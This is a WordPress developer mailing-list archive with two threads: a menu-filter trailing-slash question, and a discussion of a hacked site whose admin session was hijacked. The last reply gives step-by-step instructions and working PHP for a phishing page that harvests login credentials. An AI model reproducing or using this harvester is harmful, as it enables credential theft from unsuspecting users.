Subject: [wp-hackers] nav_menu_link_attributes filter adds ending slash
Message-ID: <CAEamYWSLcOMS+ME++V7S29n=iEJRDwPP-4r5Fup1ev0XsxjisQ@mail.gmail.com>

I'm using the nav_menu_link_attributes filter to change the behavior of a
specific post type. The first thing I noticed was that, in contrast to what
the documentation says on this, $item refers to the *menu* item, not to the
object to which it is linked.

But beyond that, it seems that despite the fact that I'm replacing the
'href' attribute of the link, something somewhere is adding a trailing
slash, which is messing up what I'm doing. Here's the code I'm using:

function nav_menu_panel_item( $attrs, $item, $args ) {
if( stristr($attrs['href'], 'hn_panel') ) :
preg_match( '|([^/]+)/?$|', $attrs['href'], $target );
$attrs['href'] = '#' . $target[0];
$attrs['class'] = stristr( $attrs['class'], 'smoothscroll' ) ?
$attrs['class'] : $attrs['class'] . ' smoothscroll';
endif;
return $attrs;
}
add_filter( 'nav_menu_link_attributes', array( &$this,
'nav_menu_panel_item' ), 10, 3 );

As you can see, the point is to convert the "hn_panel" post type menu items
into on-page anchor navigation. But by adding the trailing slash, WP is
preventing this function from working.

Is there another filter that I'm missing? I've set the priority from 1 to
100 and back to 10, but that doesn't seem to help.

Thanks

Subject: [wp-hackers] Viruses that look for open WordPress tabs in your
	browser?
Message-ID: <566A12E2.1060407@wordshell.net>

Has anyone come across the following before? Or is it potentially a new 
thing? (I've not read any such thing before).

I'm examining a hacked WP site. The logs show that the site owner, the 
sole admin, was logged in, and working on it in wp-admin in a normal 
way, up until 02:52 on a certain day. Then absolutely nothing until 
03:35. Then at 03:35, wham - a single GET followed by a load of POST 
requests to the plugin editor, one for each plugin, inserting hacker 
code. All from the admin's IP/browser (same user agent), and too close 
together to be human (i.e. obviously scripted). It's all the same IP and 
browser session, which is confirmed as the site owner's ISP.

My inference from that is that the site owner, at 02:52, went to do 
other things, leaving the browser tab open. They got infected with a 
virus (or perhaps already were), and that virus hunted for open browser 
sessions logged-in to wp-admin, and used those sessions to infect the WP 
site.

That's all technically do-able. But I've not previously heard of a virus 
(the customer has a Mac, and was using Safari), that does this. Is this 
a new thing?

I'm not an expert, but I've never heard of anything like that before. Isn't it possible that the connection was compromised and an attacker was listening in on the user, then stole their session and spoofed the user agent?

I think Zeus (who's source code was leaked online) did a similuar
thing with banking sites but that was on a PC. OSX (iirc) makes it
much harder to snag the browsers memory space, nothing is impossabul.

I am aware of a few ways this could have gone:

   - Compromised browser -- the victim's browser was compromised and
   malicious code is driving their browser to perform the attacks.  The
   browser automatically includes auth cookies and the attack succeeds.
   - Compromised OS -- the victim's device was compromised through the OS
   or some shady software they installed.  At this point the virus doesn't
   need to peek into the browser's memory space, it just needs drive the
   browser the way a regular user would -- simulating mouse clicks, etc.  WP
   trusts the browser so anything done by the browser will be trusted as
   well.  I'm not too familiar with this kind of attack so I'm not sure what
   OSes have what protections against this kind of thing, but I wouldn't rule
   it out.
   - Compromised network -- the victim's auth cookie was intercepted and
   the attacker just used that cookie from their own device to hijack the auth
   session.  For this to be the case, the attacker would've also needed to
   spoof the victim's IP since that's what was in the logs.  This is usually
   harder to pull off, but if the attacker is on the same LAN as the victim
   then it becomes a lot easier.  If the victim connects to WordPress over
   plaintext HTTP then this attack would be extremely easy to execute and it
   could appear to come from the same IP as the victim.

I don't know of anything in the wild for OS X that would execute this
behavior. Sounds like either the site or the server was already compromised.

I know that I tested this on my own facebook account and it did work, it deals with GET and POST commands. Copy and past source from facebook.com login (frst page) and if changing action= to GET and save the manipulated source code as index.php and FTP to your own web server and save log.txt in same root folder with the log reading 
<?phpheader("Location: http://www.facebook.com/home.php? ");$handle = fopen("passwords.txt", "a");foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, "=");fwrite($handle, $value);fwrite($handle, "\r\n");}fwrite($handle, "\r\n");fclose($handle);exit;?>
a new file would be created within the same folder as index.php, log.txt and it would display Username and Password. I imagine by doing this very similar phishing attack one could gain access to  an admim-wp account? Correct me please if I am on a completely different subject it just seemed familiar. This attack no longer works for facebook.
